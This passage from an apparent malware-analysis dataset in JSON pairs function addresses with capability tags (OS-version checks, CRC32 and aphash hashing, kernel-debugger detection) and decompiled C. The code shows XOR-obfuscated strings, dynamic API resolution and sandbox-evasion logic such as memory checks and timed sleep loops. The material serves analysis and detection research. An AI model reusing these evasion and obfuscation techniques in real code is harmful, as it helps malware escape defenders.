        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040b68f(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    var_38h = 0xf0c2326;\n    puVar7 = &var_54h;\n    var_1ch = in_EDX;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_34h = 0x433661e;\n    puVar7 = &var_2ch;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &var_24h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_30h = CONCAT22(var_30h._2_2_, 0x720f);\n    var_24h = 0x63685748;\n    var_20h._0_1_ = 0x72;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_10h = 5;\n    iVar6 = 0;\n    lpModuleName = iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar3 != 0xc1c0d5) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_38h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_3ch = 0x332d3d20;\n    var_38h = 0xb3d0f26;\n    var_34h = 0x3d0d2612;\n    var_30h = 0x6e2d2e07;\n    var_24h = 0x416e496e;\n    var_20h._0_1_ = 0x43;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_18h = &var_3ch - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar3 != 0xfb961d) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_3ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_48h = 0x40;\n    var_54h = 0x18;\n    var_50h = 0;\n    var_4ch = 0;\n    var_44h = 0;\n    var_40h = 0;\n    iVar6 = (*pcVar4)(&var_8h, 0xf001f, &var_54h, &var_2ch, 0x40, 0x8000000, 0);\n    if (iVar6 < 0) {\n        iVar6 = fcn.0040b198();\n    }\n    else {\n        iVar6 = fcn.0040b3ec(&var_ch);\n        puVar8 = var_ch;\n        var_10h = iVar6;\n        if (iVar6 == 0) {\n            for (; var_2ch != 0; var_2ch = var_2ch + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            *var_1ch = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, lpModuleName);\n    (*pcVar4)(uVar2);\n    return iVar6;\n}\n",
        "token_count": 1388
    },
    "0040c610": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040c610(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    puVar9 = &var_20h;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_2ch = 0xf0c2326;\n    var_28h = 0x433661e;\n    var_24h = CONCAT22(var_24h._2_2_, 0x720f);\n    var_18h = 0x63685748;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x72);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    lpModuleName = iVar7;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar4 != 0xc1c0d5) {\n            var_8h = 5;\n            *(iVar8 + iVar7) = *(&var_18h + iVar8 % 5) ^ (iVar8 + iVar7)[&var_2ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_30h = 0x12360335;\n    var_2ch = 0x2170720;\n    var_28h = 0x180c342e;\n    var_24h = 0x51684404;\n    var_18h = 0x515a7767;\n    var_14h._0_2_ = 0x6a4f;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_30h - iVar7;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetCursor)();\n        iVar4 = lpModuleName;\n        if (iVar5 != 0x318f91) {\n            var_8h = 6;\n            *(iVar8 + iVar7) = *(&var_18h + iVar8 % 6) ^ (iVar8 + iVar7)[&var_30h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    cVar2 = fcn.00404d80();\n    if (cVar2 != '\\0') {\n        var_4h = (*pcVar6)(0, var_1ch, var_20h);\n    }\n    fcn.004052ed();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar3);\n    return var_4h;\n}\n",
        "token_count": 956
    },
    "0040cb26": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040cb26(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x41dd60;\n    fcn.0040b2d1();\n    uVar2 = fcn.0040b2d1();\n    iVar3 = fcn.0040c76a(uVar2 & 0xff, 0x41dd60, 0x41dd78, &var_8h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.0040c76a(0, 0x41dd60, 0x41dd7c, &var_8h);\n        if (iVar3 != 0) {\n            var_24h = 0x35164c4f;\n            var_20h = 0x73296116;\n            var_1ch._0_2_ = 0x6e35;\n            var_18h = 0x35734c61;\n            var_14h._0_1_ = 0x6e;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetCursor)();\n                if (iVar5 != 0x363852) {\n                    var_10h = 5;\n                    *(iVar6 + iVar3) = *(&var_18h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41dd7c, iVar3);\n            iVar6 = fcn.0040c76a(0, 0x41dd60, 0x41dd70, &var_8h);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar6 != 0) {\n                var_4h = var_4h ^ 0x29787279;\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar6 = fcn.0040c76a(0, &var_4h, 0x41dd64, &var_8h);\n                if (iVar6 != 0) {\n                    var_ch = 1;\n                }\n            }\n            uVar4 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 715
    },
    "0040cc7b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040cc7b(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    uint unaff_EBX;\n    int32_t iVar9;\n    uchar *puVar10;\n    uint uStack1436;\n    uchar *puStack1432;\n    uchar *puStack1428;\n    uint uStack1424;\n    uint uStack1420;\n    int32_t iStack1416;\n    code *pcStack1412;\n    uint uStack1408;\n    uchar *puStack1404;\n    uint uStack1400;\n    int32_t iStack1396;\n    uint uStack1392;\n    uchar *puStack1388;\n    uint uStack1384;\n    uint uStack1380;\n    uint uStack1376;\n    int32_t iStack1372;\n    uchar *puStack1368;\n    uint uStack1364;\n    uint uStack1360;\n    uint uStack1356;\n    int32_t iStack1352;\n    uint uStack1348;\n    uint uStack1324;\n    uchar *puStack1320;\n    uint uStack1316;\n    uint uStack1312;\n    uint uStack1308;\n    uint uStack1304;\n    ushort uStack1300;\n    int32_t iStack1296;\n    int32_t iStack1292;\n    uchar *puStack1288;\n    int32_t iStack1284;\n    uint uStack1280;\n    uint uStack1276;\n    uint uStack1272;\n    uint uStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    uint uStack1256;\n    uint uStack1252;\n    uint uStack1248;\n    uint uStack1244;\n    uint uStack1240;\n    uint uStack1236;\n    uint uStack1232;\n    uint uStack1228;\n    uint uStack1224;\n    uint uStack1220;\n    uint uStack1216;\n    uint uStack1212;\n    uint uStack1208;\n    uint uStack1204;\n    ushort uStack1200;\n    uint32_t uStack1196;\n    int32_t iStack1192;\n    uint uStack1172;\n    uint uStack1168;\n    uchar auStack1160 [4];\n    int32_t iStack1156;\n    uchar auStack1148 [8];\n    uint uStack1140;\n    int16_t iStack1136;\n    uchar auStack1134 [22];\n    uchar auStack1112 [4];\n    uchar auStack1108 [40];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    uStack1140 = 0x200;\n    uStack1312 = 0x23101c5e;\n    puVar10 = &stack0xfffffbf8;\n    for (iVar7 = 0x400; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1308 = 0x504a5950;\n    puVar10 = &stack0xfffffb90;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1348 = 0xe;\n    uStack1304 = 0x15595163;\n    puVar10 = &stack0xfffffbd4;\n    for (iVar7 = 0x24; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    iStack1352 = 8;\n    uStack1300 = CONCAT11(uStack1300._1_1_, 0x62);\n    uStack1324 = CONCAT31(uStack1324._1_3_, 0x35);\n    uStack1356 = 0x40ccf3;\n    uStack1356 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1360 = 0x40ccfa;\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1284 = 5;\n    uStack1264 = 0;\n    iVar9 = 0;\n    iStack1156 = iVar7;\n    do {\n        uStack1360 = 0x40cd21;\n        iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar3 != 0x2d0487) {\n            *(iVar9 + iVar7) = (&stack0xfffffac4)[iVar9 % iStack1284] ^ (iVar9 + iVar7)[&stack0xfffffad4 + -iVar7];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0xd);\n    uStack1360 = 0x15;\n    uStack1364 = 8;\n    uStack1324 = 0x223a5373;\n    puStack1320 = 0x385f4052;\n    uStack1316 = 0x454d6009;\n    uStack1312 = 0x7d5e093a;\n    uStack1308 = 0x33032858;\n    iVar7 = CONCAT31(unaff_EBX >> 8, 0x33);\n    puStack1368 = 0x40cd82;\n    puStack1368 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    iStack1372 = 0x40cd89;\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar3 = 0;\n    iStack1292 = iVar9;\n    puStack1288 = &stack0xfffffac8 + -iVar9;\n    do {\n        iStack1372 = 0x40cda5;\n        iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar4 != 0x95e0fb) {\n            *(iVar3 + iVar9) = (&stack0xfffffab8)[iVar3 % iStack1296] ^ (iVar3 + iVar9)[&stack0xfffffac8 + -iVar9];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x14);\n    uStack1376 = uStack1168;\n    uStack1380 = 0x40cdd4;\n    iStack1372 = iVar9;\n    uStack1380 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack1384 = 0x40cddb;\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack1172 = 0x40;\n    uStack1384 = &stack0xfffffb6c;\n    puStack1388 = 0x40cdf6;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    puStack1388 = &stack0xfffffbac;\n    if (pcVar5 == NULL) {\n        uStack1392 = 0x40ce0c;\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        uStack1392 = 0x40ce04;\n        (*pcVar5)();\n    }\n    uStack1392 = 0xbd;\n    iStack1396 = 8;\n    iStack1292 = 0x462d7027;\n    puStack1288 = 0x700b7040;\n    iStack1284 = 0x7053463b;\n    uStack1280 = 0x4629701d;\n    uStack1276 = 0x702b706e;\n    uStack1272 = 0x70614609;\n    uStack1268 = 0x461e702c;\n    uStack1264 = 0x703f707b;\n    uStack1260 = 0x707b4618;\n    uStack1256 = 0x46027020;\n    uStack1252 = 0x703c706e;\n    uStack1248 = 0x70414635;\n    uStack1244 = 0x4629701b;\n    uStack1240 = 0x7033705f;\n    uStack1236 = 0x7057460f;\n    uStack1232 = 0x46387001;\n    uStack1228 = 0x700e7040;\n    uStack1224 = 0x70624620;\n    uStack1220 = 0x4623701d;\n    uStack1216 = 0x700a7051;\n    uStack1212 = 0x7041463f;\n    uStack1208 = 0x463e7000;\n    uStack1204 = 0x705f706e;\n    uStack1200 = 0x464c;\n    uStack1304 = 0x464c706f;\n    uStack1300 = 0x7032;\n    uStack1400 = 0x40cf1f;\n    uStack1400 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack1404 = 0x40cf26;\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar3 = 0;\n    uStack1384 = iVar9;\n    puStack1320 = &stack0xfffffae8 + -iVar9;\n    do {\n        puStack1404 = NULL;\n        uStack1408 = 0x40cf4b;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        if (iVar4 != 0x68b323) {\n            *(iVar3 + iVar9) = (&stack0xfffffadc)[iVar3 % 6] ^ (iVar3 + iVar9)[&stack0xfffffae8 + -iVar9];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x5e);\n    puStack1404 = &stack0xfffffb4c;\n    pcStack1412 = reloc.WS2_32.dll_bind;\n    iStack1416 = 0x40cf82;\n    uStack1408 = iVar9;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 == 0) {\n        iStack1416 = 0x51;\n        uStack1420 = 8;\n        uStack1380 = 0x34407065;\n        uStack1376 = 0x70565517;\n        iStack1372 = 0x550b3457;\n        puStack1368 = 0x345d7046;\n        uStack1364 = 0x707b550a;\n        uStack1360 = 0x55153453;\n        uStack1356 = 0x34617050;\n        iStack1352 = 0x7047550c;\n        uStack1348 = 0x5516345b;\n        puStack1388 = 0x34327035;\n        uStack1384 = CONCAT22(uStack1384._2_2_, 0x5578);\n        uStack1424 = 0x40cff9;\n        uStack1424 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        puStack1428 = 0x40d000;\n        iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        iVar7 = 0;\n        do {\n            puStack1428 = 0x40d01c;\n            iVar3 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n            if (iVar3 != 0xa42078) {\n                *(iVar7 + iVar9) = (&stack0xfffffa88)[iVar7 % iStack1352] ^ (iVar7 + iVar9)[&stack0xfffffa90 + -iVar9];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x28);\n        puStack1428 = &stack0xfffffb3c;\n        puStack1432 = &stack0xfffffba8;\n        uStack1436 = 0;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(uStack1228, iVar9, 0);\n        piVar8 = &stack0xfffffb90;\n        do {\n            iVar1 = *piVar8;\n            piVar8 = piVar8 + 1;\n        } while (iVar1 != uStack1356);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (piVar8 - &stack0xfffffb92 >> 1 != 0) {\n            iStack1416 = 0x6c293714;\n            pcStack1412 = 0x37226e36;\n            uStack1408 = CONCAT22(uStack1408._2_2_, 0x6c4c);\n            uStack1424 = 0x6c4c374c;\n            uStack1420 = CONCAT22(uStack1420._2_2_, 0x6e59);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            iVar9 = 0;\n            puStack1368 = &stack0xfffffa6c + -iVar7;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n                if (iVar3 != 0xa7d6fd) {\n                    *(iVar9 + iVar7) =\n                         (&stack0xfffffa64)[iVar9 % puStack1388] ^ (iVar9 + iVar7)[&stack0xfffffa6c + -iVar7];\n                }\n                pcVar2 = _sym.imp.SHLWAPI.dll_StrStrIW;\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < 10);\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffb84, iVar7);\n            iVar9 = uStack1384;\n            while (pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap,  iVar3 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar3 = (*pcVar2)(&stack0xfffffb78, iVar7);\n            }\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        }\n        iVar7 = iStack1372;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack1252);\n        uVar6 = (*pcVar5)(0, iVar9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        iVar9 = iStack1396;\n    }\n    while ((iStack1192 == 0 && (uStack1196 < 2100000000))) {\n        iStack1416 = 10000;\n        uStack1420 = 0x40d17f;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    uStack1420 = 0;\n    uStack1424 = 0x40d1a1;\n    iStack1416 = iVar9;\n    uStack1424 = (*pcVar5)();\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    puStack1428 = 0x40d1aa;\n    (*_sym.imp.KERNEL32.dll_HeapFree)();\n    puStack1432 = NULL;\n    uStack1436 = 0x40d1b0;\n    puStack1428 = iVar7;\n    uStack1436 = (*pcVar5)();\n    (*pcVar2)();\n    uVar6 = (*pcVar5)(0, uStack1236);\n    (*pcVar2)(uVar6);\n    return;\n}\n",
        "token_count": 3598
    },
    "0040e649": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040e649(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *hHeap;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    iVar6 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (hHeap = param_1[1],  hHeap != NULL)) {\n        if (*param_1 == *hHeap) {\n            var_38h = 0x302b1810;\n            var_34h = 0x2a032157;\n            var_30h = 0x1f274004;\n            var_2ch = 0x24473634;\n            var_28h = 0x3206220a;\n            var_24h = 0x74476c42;\n            var_20h._0_1_ = 0x32;\n            var_1ch = param_2;\n            var_18h = param_1;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            var_8h = 5;\n            iVar7 = 0;\n            var_10h = &var_38h - iVar6;\n            var_14h = iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetInputState)();\n                if (iVar4 != 0x89b8d) {\n                    *(iVar7 + iVar6) = *(&var_24h + iVar7 % var_8h) ^ (iVar7 + iVar6)[var_10h];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x14);\n            var_30h = 0xf0c2326;\n            var_2ch = 0x433661e;\n            var_28h = CONCAT22(var_28h._2_2_, 0x720f);\n            var_24h = 0x63685748;\n            var_20h._0_1_ = 0x72;\n            uVar3 = (*pcVar1)(8, 0xb);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            var_10h = &var_30h - iVar7;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                iVar4 = var_14h;\n                if (iVar5 != 0xc1c0d5) {\n                    *(iVar6 + iVar7) = *(&var_24h + iVar6 % var_8h) ^ (iVar6 + iVar7)[var_10h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar7, var_14h);\n            var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            uVar3 = (*pcVar1)(8, hHeap[1]);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = *hHeap;\n            var_18h = var_18h[1] + 0xc;\n            fcn.0040e5b7();\n            piVar2 = hHeap;\n            iVar6 = (*var_14h)(2, var_8h, hHeap[1], var_18h, iVar6 + -0xc, &var_ch);\n            hHeap = iVar6;\n            if (iVar6 == 0) {\n                if (var_ch == piVar2[1]) {\n                    var_1ch[1] = var_8h;\n                    *var_1ch = var_ch;\n                }\n                else {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    iVar6 = -0x3fffff85;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*pcVar1)(uVar3);\n        }\n        else {\n            iVar6 = -0x3fffff85;\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 1226
    },
    "0040fd3d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040fd3d(uint param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_18h = 0;\n    iVar2 = fcn.0040f7c5(&var_8h);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.SHLWAPI.dll_StrDupW)(param_1);\n        var_14h = iVar2;\n        var_10h = fcn.0040b17e();\n        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_10h != 0) {\n            var_2ch = 0x592c5a17;\n            var_28h = 0x5a5f641f;\n            var_24h._0_2_ = 0x5945;\n            var_20h = 0x59455a39;\n            var_1ch._0_2_ = 0x6471;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar8 = iVar7;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                iVar2 = var_14h;\n                iVar7 = var_18h;\n                if (iVar5 != 0x6ebc13) {\n                    var_ch = 6;\n                    *(iVar8 + piVar4) = *(&var_20h + iVar8 % 6) ^ (iVar8 + piVar4)[&var_2ch - piVar4];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 10);\n            piVar6 = piVar4;\n            do {\n                iVar1 = *piVar6;\n                *((var_10h - piVar4) + piVar6) = iVar1;\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar8 = fcn.0040dfbd(var_8h);\n        if (iVar8 == 0) {\n            iVar8 = fcn.0040f8d1();\n            if (iVar8 != 0) {\n                iVar7 = 1;\n            }\n        }\n        if (iVar2 != 0) {\n            uVar3 = (*pcVar9)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        uVar3 = (*pcVar9)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar7;\n}\n",
        "token_count": 838
    },
    "004041de": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004041de(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 235
    },
    "00404862": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
